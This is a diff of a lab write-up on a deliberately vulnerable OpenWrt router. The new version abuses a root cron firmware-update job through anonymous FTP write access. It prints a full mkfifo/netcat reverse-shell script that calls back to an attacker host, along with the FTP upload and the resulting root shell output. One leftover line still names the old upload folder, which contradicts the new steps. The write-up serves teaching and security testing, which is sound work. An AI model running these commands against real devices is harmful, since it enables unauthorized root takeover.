@@ -733,121 +733,100 @@ The ‘0’ in the *check_signature* option indicates that the tool never checks
 We can detect in the firmware that there is a file in */etc/crontabs* called *root* that executes a cron task. Inside, we find this:
 
 ```shell
-* * * * * cd /tmp/cron-tmp/ && sh backup.sh
+*/3 * * * * /opt/oem-updates/scripts/auto-updater.sh
 ```
 
-The crond daemon, which we can verify is running on the system, executes this task where it accesses a folder in the temporary directory and runs a script for supposed *backups* every minute. If we found a way to change its content, we could abuse *root* privileges, for example, by opening a *reverse shell.*
+The device implements automatic firmware updates but lacks cryptographic verification of the update package. The update mechanism accepts unsigned images from arbitrary locations (FTP/HTTP), allowing attackers to flash malicious firmware that persists across reboots.
 
-As we detected in the [[#FTP]] section, we know that there is an *anonymous* user. Let's see how far we can analyze with this user.
+The connection to the directory via FTP does not reveal any clues that would allow the attacker to know where they are accessing, but this could be discovered through static analysis of the firmware. However, we do find text that appears to be related to the functionality of this service.
 
-```shell
-anonymous@OpenWrt:~$ cat /etc/crontabs/root 
-cat: can't open '/etc/crontabs/root': Permission denied
-anonymous@OpenWrt:~$ ls -ld /etc/crontabs/
-drwxr-xr-x    1 root     root          3488 Jun 23 21:41 /etc/crontabs/
-anonymous@OpenWrt:~$ ls -ld /etc/crontabs/root
--rw-------    1 root     root            44 Jun 23 21:41 /etc/crontabs/root
-```
-
-As expected, the file belongs to root and cannot be modified or read by anyone other than the router administrator. In the analysis of the FTP protocol running on the system, we could see that we were accessing the router's */tmp* folder.
-
-```shell
-❯ ftp 192.168.1.1
-Connected to 192.168.1.1.
+```zsh
+$ ftp 192.168.2.1
+Connected to 192.168.2.1.
 220 Operation successful
-Name (192.168.1.1:xxxxxxxx): anonymous
+Name (192.168.2.1:d4str3k): anonymous
 230 Operation successful
 Remote system type is UNIX.
 Using binary mode to transfer files.
-ftp> dir
-229 EPSV ok (|||42463|)
-150 Directory listing
-drwx------    2 0        0               40 Jun 23 21:29 .uci
-drwxr-xr-x    3 0        0               60 Jun 23 21:30 cache
-drwxr-xr-x    2 0        0               40 Jun 23 21:29 dnsmasq.cfg01411c.d
-drwxr-xr-x    4 0        0              140 Jun 23 21:30 etc
-drwxrwxrwx    2 1001     1001            40 Jun 23 21:30 ftp
-drwxr-xr-x    2 0        0               60 Jun 23 21:30 hosts
-drwxr-xr-x    6 0        0              120 Jun 23 21:30 lib
-drwxr-xr-x    4 0        0              740 Jun 23 22:08 lock
-drwxr-xr-x    3 0        0              140 Jun 23 21:30 log
-drwxr-xr-x    2 0        0               40 Jun 23 21:54 opkg-lists
-drwxr-xr-x    2 0        0               40 Jan  1  1970 overlay
-drwxr-xr-x    2 0        0               60 Jun 23 21:30 resolv.conf.d
-drwxr-xr-x   10 0        0              480 Jun 23 21:30 run
-drwxrwxrwt    2 0        0               40 Jun 23 21:30 shm
-drwxr-xr-x    3 0        0               60 Jun 23 21:30 spool
-drwxr-xr-x    2 0        0               60 Jun 23 21:30 state
-drwxr-xr-x    2 0        0               80 Jan  1  1970 sysinfo
-drwxr-xr-x    2 0        0               40 Jun 23 21:29 tmp
-drwxr-xr-x    3 0        0               60 Jun 23 21:54 usr
-----------    1 0        0                0 Jun 23 21:30 .ujailnoafile
--rw-r--r--    1 0        0                4 Jun 23 21:29 TZ
--rw-r--r--    1 0        0                0 Jun 23 21:29 dhcp.leases
--rw-r--r--    1 0        0               47 Jun 23 21:30 resolv.conf
+ftp> get README.txt
+local: README.txt remote: README.txt
+229 EPSV ok (|||39489|)
+150 Opening BINARY connection for README.txt (684 bytes)
+100% |*********************************************************|   684       10.19 MiB/s    00:00 ETA
 226 Operation successful
-ftp> 
+684 bytes received in 00:00 (3.21 MiB/s)
+ftp> exit
+221 Operation successful
+
+$ cat README.txt 
+========================================
+OEM FIRMWARE UPDATE SERVER - STAGING
+========================================
+Location: /opt/oem-updates/pending/
+User: anonymous (write-enabled)
+
+SUPPORTED FILE TYPES:
+  *.img    - Standard OpenWRT firmware images (sysupgrade)
+  *.sh     - Pre-installation hooks/preparation scripts
+
+INSTRUCTIONS:
+1. Upload firmware files (*.img) to this directory
+2. System auto-processes every 3 minutes via root cron
+3. Files are automatically executed/installed and deleted
+
+WARNING: Ensure compatibility with RoutCoon hardware.
+Invalid files may cause system instability.
+
+For support: contact@routcoon-oem.local
+========================================   
 ```
 
-The *cron-tmp* folder does not exist, so we can create it and enter the script that root will execute to open a shell with privileged permissions.
+We now know that this directory contains the scripts and binary files that execute the update on the vulnerable router. This document tells us that pre-installation scripts are run to prepare for the update, so we can try to see if the mechanism responsible for executing these scripts validates them or if, on the contrary, we can execute commands remotely.
+
+In this case, commands can be executed remotely, so we can obtain a forward shell by using netcat and mkfifo with the following script.  We open a connection this way since OpenWRT uses BusyBox, so it does not have /dev/tcp implemented.
 
 ```sh
-rm /tmp/f; mkfifo /tmp/f
-cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PUERTO> > /tmp/f
-```
-
-Using *nc*, we can open a forward shell, since OpenWRT uses *BusyBox*, so it does not have */dev/tcp.* implemented.
-
-```shell
-❯ catn backup.sh
 #!/bin/ash
-rm /tmp/f; mkfifo /tmp/f
-cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.2 4646 > /tmp/f
-❯ nc -lvnp 4646
-Listening on 0.0.0.0 4646
+rm /tmp/f
+mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.2.2 9001 > /tmp/f
 ```
 
 We use FTP to upload the script to the */tmp/cron-tmp* folder and wait for the script to run.
 
 ```shell
-❯ ftp 192.168.1.1
-Connected to 192.168.1.1.
+$ ftp 192.168.2.1
+Connected to 192.168.2.1.
 220 Operation successful
-Name (192.168.1.1:maxgarci): anonymous
+Name (192.168.2.1:d4str3k): anonymous
 230 Operation successful
 Remote system type is UNIX.
 Using binary mode to transfer files.
-ftp> mkdir cron-tmp
-257 Operation successful
-ftp> cd cron-tmp
-250 Operation successful
-ftp> put backup.sh
-local: backup.sh remote: backup.sh
-229 EPSV ok (|||39467|)
+ftp> put script.sh 
+local: script.sh remote: script.sh
+229 EPSV ok (|||43203|)
 150 Ok to send data
-100% |******************************************************|    96        1.12 MiB/s    00:00 ETA
+100% |*********************************************************|    95      779.60 KiB/s    00:00 ETA
 226 Operation successful
-96 bytes sent in 00:00 (107.02 KiB/s)
-ftp> dir
-229 EPSV ok (|||32795|)
-150 Directory listing
--rw-r--r--    1 1001     1001            96 Jun 23 22:20 backup.sh
-226 Operation successful
-ftp> 
-```
+95 bytes sent in 00:00 (130.85 KiB/s)
+ftp> exit
+221 Operation successful
 
-```shell
-❯ nc -lvnp 4646
-Listening on 0.0.0.0 4646
-Connection received on 192.168.1.1 51360
+$ nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 192.168.2.1 54916
 
 
 /bin/sh: can't access tty; job control turned off
-BusyBox v1.36.1 (2025-06-23 20:40:36 UTC) built-in shell (ash)
+BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)
 
-/tmp/cron-tmp # id
+~ # id
 uid=0(root) gid=0(root) groups=0(root)
-/tmp/cron-tmp # 
+~ # whoami
+root
+~ # ls
+vulnzoo.log
+~ # 
 ```
 # IoT:I5: Using Insecure or Outdated Components
 ## Definition
